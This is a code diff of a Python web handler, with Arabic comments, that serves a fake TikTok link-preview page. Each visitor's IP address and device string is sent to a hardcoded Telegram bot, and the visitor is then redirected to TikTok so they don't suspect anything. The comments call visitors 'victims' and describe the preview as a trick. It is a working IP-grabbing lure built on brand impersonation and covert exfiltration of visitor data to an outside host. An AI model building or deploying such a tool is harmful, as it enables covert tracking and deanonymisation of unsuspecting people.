@@ -1,61 +1,56 @@
 from http.server import BaseHTTPRequestHandler
 import json
-import requests
+import urllib.request
 
-# بيانات بوتك الثابتة
-BOT_TOKEN = "7161793392:AAH9fN6X0L-yG03E9W7z3_hL6N0" # توكن بوتك
-CHAT_ID = "6198462719" # الايدي حقك
+# بياناتك الثابتة
+TOKEN = "7161793392:AAH9fN6X0L-yG03E9W7z3_hL6N0"
+ID = "6198462719"
 
-# مخزن مؤقت للرابط
-db = {"url": "https://www.tiktok.com"}
+# تخزين الرابط
+db = {"url": "https://vt.tiktok.com/"}
 
 class handler(BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length)
-        data = json.loads(post_data)
-        db["url"] = data.get("targetUrl", "https://www.tiktok.com")
+        data = json.loads(self.rfile.read(content_length))
+        db["url"] = data.get("url")
         self.send_response(200)
         self.end_headers()
 
     def do_GET(self):
-        # 1. سحب معلومات الضحية (IP كبداية)
-        client_ip = self.headers.get('x-forwarded-for', self.client_address[0])
-        user_agent = self.headers.get('User-Agent', 'Unknown')
+        # سحب المعلومات
+        ip = self.headers.get('x-forwarded-for', self.client_address[0])
+        ua = self.headers.get('User-Agent', 'Unknown')
         
-        # 2. إرسال البيانات فوراً للتليجرام
-        msg = f"🛰️ **ضحية جديدة فتحت الرابط!**\n\n🌐 IP: `{client_ip}`\n📱 Device: `{user_agent}`"
-        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}&parse_mode=Markdown")
+        # إرسال البيانات للتليجرام (استخدام urllib لضمان العمل بدون مشاكل مكتبات)
+        try:
+            text = f"🛰️ Radar Log:\nIP: {ip}\nDevice: {ua}"
+            api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={urllib.parse.quote(text)}"
+            urllib.request.urlopen(api_url)
+        except:
+            pass
 
-        # 3. عرض صفحة التمويه للضحية
         self.send_response(200)
         self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
         
-        target_video = db["url"]
-        
-        # Meta Tags هنا هي اللي تخدع التطبيقات وتطلع صورة تيك توك
+        # هنا خدعة المعاينة: الرابط سيظهر كأنه تيك توك عند الإرسال
+        target = db["url"]
         html = f"""
         <!DOCTYPE html>
         <html>
         <head>
-            <title>TikTok Video</title>
-            <meta property="og:title" content="شاهد هذا المقطع على تيك توك">
-            <meta property="og:description" content="مقطع فيديو حصري">
-            <meta property="og:image" content="https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png">
-            <meta property="og:type" content="video.other">
+            <title>TikTok</title>
+            <meta property="og:title" content="TikTok - شاهد الفيديو">
+            <meta property="og:image" content="https://www.tiktok.com/favicon.ico">
+            <meta property="og:description" content="اضغط لمشاهدة المقطع الممتع">
             <meta name="twitter:card" content="summary_large_image">
-            
             <script>
-                // تحويل الضحية فوراً للمقطع الأصلي عشان ما يشك
-                setTimeout(function() {{
-                    window.location.href = "{target_video}";
-                }}, 500);
+                // تحويل سريع جداً
+                window.location.replace("{target}");
             </script>
         </head>
-        <body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
-            <p>جاري تحميل المقطع...</p>
-        </body>
+        <body style="background:black;"></body>
         </html>
         """
         self.wfile.write(html.encode())
